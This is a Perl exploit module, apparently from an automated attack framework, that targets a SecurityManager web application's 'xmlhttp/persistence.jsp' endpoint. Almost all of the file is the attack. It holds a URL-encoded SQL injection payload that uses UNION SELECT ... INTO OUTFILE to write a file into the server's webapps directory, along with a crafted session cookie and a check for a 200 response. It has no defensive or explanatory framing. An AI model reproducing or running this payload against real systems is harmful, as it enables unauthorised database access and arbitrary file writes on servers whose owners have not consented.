package MSFExploits::Exploits::48637::MSF::jsp;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::48637);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "jsp";

   my $DETECTION = {

   };

   my $EXPLOIT = {
  TYPE => 'MSF',
  PLATFORM => 'STATE_ID',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'xmlhttp/persistence.jsp',
      PAYLOAD      => 'ANDOR=and&condition_1=OpenPorts%40PORT&operator_1=IN&value_1=5%29%29%20union%20select%20%40%40version%2c2%2c3%2c4%2c5%2c6%2c7%2c8%2c9%2c10%2c11%2c12%2c13%2c14%2c15%2c16%2c17%2c18%2c19%2c20%2c21%2c22%2c23%2c24%2c25%2c26%2c27%2c28%20into%20outfile%20%22../../webapps/SecurityManager/hhPIe.txt%22%20FROM%20mysql.user%20WHERE%205%3d%28%285&COUNT=1',
      TEXT   => 'Sending Exploit #2 Request : [POST] /xmlhttp/persistence.jsp',
      HEADERS      => {
        'Cookie' => 'STATE_COOKIE=&SecurityManager/ID/174/HomePageSubDAC_LIST/223/SecurityManager_CONTENTAREA_LIST/226/MainDAC_LIST/166&MainTabs/ID/167/_PV/174/selectedView/Home&Home/ID/166/PDCA/MainDAC/_PV/174&HomePageSub/ID/226/PDCA/SecurityManager_CONTENTAREA/_PV/166&HomePageSubTab/ID/225/_PV/226/selectedView/HomePageSecurity&HomePageSecurity/ID/223/PDCA/HomePageSubDAC/_PV/226&_REQS/_RVID/SecurityManager/_TIME/31337; 2RequestsshowThreadedReq=showThreadedReqshow; 2RequestshideThreadedReq=hideThreadedReqhide;',
        'Accept-Encoding' => 'identity',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
